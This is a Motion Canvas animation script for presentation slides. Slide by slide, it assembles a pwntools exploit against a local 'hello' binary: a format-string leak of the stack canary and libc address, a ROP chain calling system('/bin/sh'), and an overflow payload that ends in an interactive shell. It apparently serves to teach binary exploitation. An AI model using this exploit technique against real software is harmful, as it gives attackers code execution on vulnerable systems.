import {Circle, makeScene2D} from '@motion-canvas/2d';
import {DEFAULT, Direction, all, beginSlide, createRef, slideTransition} from '@motion-canvas/core';
import { CodeBlock, remove, insert, edit, lines } from '@motion-canvas/2d/lib/components/CodeBlock';

const BACKGROUND = '#282C34';
const RED = '#E06C75';
const GREEN = '#98C379';
const YELLOW = '#E5C07B';
const BLUE = '#61AFEF';
const MAGENTA = '#C678DD';
const CYAN = '#56B6C2';
const GRAY = '#ABB2BF';
const WHITE = '#FFFFFF';
const BLACK = '#000000';

export default makeScene2D(function* (view) {
    const code = createRef<CodeBlock>();
    yield view.add(
        <CodeBlock
        ref={code}
        language='py'
        code={`
        from pwn import *
        # Hello, libc a canary`}
        fontSize={90}
    />);
    yield* slideTransition(Direction.Right);

    yield* beginSlide("program");

    yield* all(code().edit(.3,false)`
    from pwn import *
    # Hello, libc a canary
    ${insert(`

    bin = ELF('./hello')
    libc = ELF('/usr/lib/libc.so.6')

    context.terminal = "kitty"

    # io = process('./hello')
    io = gdb.debug('./hello')`)}`,
    code().selection(lines(2, 10), .3));

    yield* beginSlide("read");

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')${insert(`

io.recvuntil(b"name: ")`)}`,
    code().selection(lines(11), .3));

    yield* beginSlide("write printf");

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')

io.recvuntil(b"name: ")${insert(`
io.sendline(b"%7$lx;%8$lx")`)}`,
    code().selection(lines(12), .3));

    yield* beginSlide("offsets");

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')

io.recvuntil(b"name: ")
io.sendline(b"%7$lx;%8$lx")${insert(`
io.recvuntil(b"Welcome ")
leak = io.recvline().strip().split(b';')
leak = [int(x, 16) for x in leak]`)}`,
    code().selection(lines(13, 15), .3));

    yield* beginSlide("calculations");

    yield* code().fontSize(50, .2);

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')

io.recvuntil(b"name: ")
io.sendline(b"%7$lx;%8$lx")
io.recvuntil(b"Welcome ")
leak = io.recvline().strip().split(b';')
leak = [int(x, 16) for x in leak]${insert(`

canary = leak[0]
libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
print("libcaddr: " + hex(libc.address))
print("canary:   " + hex(canary))`)}`,
    code().selection(lines(16, 20), .3));

    yield* beginSlide("rop");

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')

io.recvuntil(b"name: ")
io.sendline(b"%7$lx;%8$lx")
io.recvuntil(b"Welcome ")
leak = io.recvline().strip().split(b';')
leak = [int(x, 16) for x in leak]

canary = leak[0]
libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
print("libcaddr: " + hex(libc.address))
print("canary:   " + hex(canary))${insert(`

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
rop.call(libc.symbols['exit'], [0])`)}`,
    code().selection(lines(22, 25), .3));

    yield* beginSlide("send");

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')

io.recvuntil(b"name: ")
io.sendline(b"%7$lx;%8$lx")
io.recvuntil(b"Welcome ")
leak = io.recvline().strip().split(b';')
leak = [int(x, 16) for x in leak]

canary = leak[0]
libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
print("libcaddr: " + hex(libc.address))
print("canary:   " + hex(canary))

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
rop.call(libc.symbols['exit'], [0])${insert(`

io.recvuntil(b"name: ")
io.sendline(flat({
    32: p32(0), 40: p64(canary), 56: libc.sym["system"] + 44, 64: rop.chain()
}))`)}`,
    code().selection(lines(26, 29), .3));

    yield* beginSlide("send");

    yield* all(code().edit(.3, false)`
from pwn import *
# Hello, libc a canary

bin = ELF('./hello')
libc = ELF('/usr/lib/libc.so.6')

context.terminal = "kitty"

# io = process('./hello')
io = gdb.debug('./hello')

io.recvuntil(b"name: ")
io.sendline(b"%7$lx;%8$lx")
io.recvuntil(b"Welcome ")
leak = io.recvline().strip().split(b';')
leak = [int(x, 16) for x in leak]

canary = leak[0]
libc.address = leak[1] - (0x7792fd610cd0 - 0x7792fd5eb000)
print("libcaddr: " + hex(libc.address))
print("canary:   " + hex(canary))

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
rop.call(libc.symbols['exit'], [0])

io.recvuntil(b"name: ")
io.sendline(flat({
    32: p32(0), 40: p64(canary), 56: libc.sym["system"] + 44, 64: rop.chain()
}))${insert(`

io.interactive()`)}`,
    code().selection(DEFAULT, .3));

    yield* beginSlide("done");
});
